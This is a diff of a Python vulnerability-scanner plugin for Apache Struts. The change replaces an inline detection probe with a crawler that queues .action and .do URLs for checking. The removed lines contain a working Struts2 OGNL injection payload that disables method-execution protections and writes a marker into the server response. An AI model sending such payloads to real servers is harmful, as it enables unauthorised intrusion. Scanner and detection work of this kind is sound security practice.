@@ -1,28 +1,36 @@
+#!/usr/bin/evn python
+# -*- coding: utf-8 -*-
 # Embedded file name: struts.py
 import urlparse
-import time
+import re
 
 
 def assign(service, arg):
     if service == "www":
-        OO0o = urlparse.urlparse(arg)
+        return True, arg
+
+
+def _get_new_urls(page_url, links):
+    new_urls = set()
+    for link in links:
+        new_url = link
+        new_full_url = urlparse.urljoin(page_url, new_url)
+        OO0o = urlparse.urlparse(new_full_url)
         if OO0o.path.endswith(".action") or OO0o.path.endswith(".do"):
-            return True, "%s://%s%s" % (OO0o.scheme, OO0o.netloc, OO0o.path)
-        return True, '%s://%s' % (OO0o.scheme, OO0o.netloc)
+            new_urls.add(new_full_url)
+    return new_urls
 
 
 def audit(arg):
-    task_push('struts',arg)
-    # return True, '%s://%s/website-rank/getVoteRecordByManuscriptId.action' % (OO0o.scheme, OO0o.netloc)
-    ii11i = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@websafescan@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
-    oOooOoO0Oo0O = '''@websafescan@'''
-    iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2('''%s?stamp=%s&%s''' % (arg, str(time.time()), ii11i))
-    if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
-        security_hole(arg)
-    else:
-        iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2(arg, '''stamp=%s&%s''' % (str(time.time()), ii11i))
-        if OoOoOO00 and OoOoOO00.find(oOooOoO0Oo0O) != -1:
-            security_hole(arg)
+    # task_push('struts',arg)
+    code, head, html, redirect_url, log = hackhttp.http(arg)
+
+    webreg = re.compile('''<a[^>]+href=["\'](.*?)["\']''', re.IGNORECASE)
+    urls = webreg.findall(html)
+    struts_urls = _get_new_urls(arg,urls)
+    security_info("struts框架")
+    for struts_url in struts_urls:
+        task_push('struts', struts_url)
 
 
 if __name__ == '__main__':
